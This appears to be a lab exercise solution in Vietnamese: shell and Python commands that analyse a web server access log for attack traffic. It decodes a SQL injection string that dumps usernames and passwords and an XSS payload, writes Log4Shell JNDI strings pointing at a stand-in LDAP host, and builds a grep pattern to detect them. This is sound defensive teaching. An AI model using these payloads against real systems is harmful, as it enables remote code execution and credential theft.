# Lời giải 🧪 bài 10.9 — chạy thật 24/11/2026 trên log Lab 10 (scratchpad/lgz/chay/logs, cùng tệp của tan-cong.out.txt), GNU awk/grep + Python 3 trên máy chủ
awk '$9 ~ /^4/ {n[$1]++; if (!seen[$1, $7]++) d[$1]++} END {for (ip in n) if (n[ip] >= 5) print ip, n[ip] " lần 4xx", d[ip] " đường dẫn khác nhau"}' logs/access.log | sort -k4 -rn
awk '$1 == "203.0.113.66" && $9 ~ /^2/ {print $9, $7}' logs/access.log
awk '$1 == "203.0.113.66" && $9 ~ /^2/ && $7 !~ /^\/api\/products\?/' logs/access.log | wc -l
python3 -c "import urllib.parse,sys; [print(urllib.parse.unquote(a)) for a in sys.argv[1:]]" '/api/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--' '/api/products?q=%3Cscript%3Ealert(1)%3C/script%3E'
printf '%s\n' 'ua=${jndi:ldap://x.test/a}' 'GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fx.test%2Fa%7D' 'ua=${${lower:j}ndi:ldap://x.test/a}' 'ua=Mozilla/5.0 {jndi} binh thuong' > thu-jndi.txt; cat -n thu-jndi.txt
grep -niE '(\$|%24)(\{|%7B)(jndi|(\$|%24)(\{|%7B)lower:j(\}|%7D)ndi)' thu-jndi.txt
grep -ciE '(\$|%24)(\{|%7B)(jndi|(\$|%24)(\{|%7B)lower:j(\}|%7D)ndi)' logs/access.log
rm thu-jndi.txt
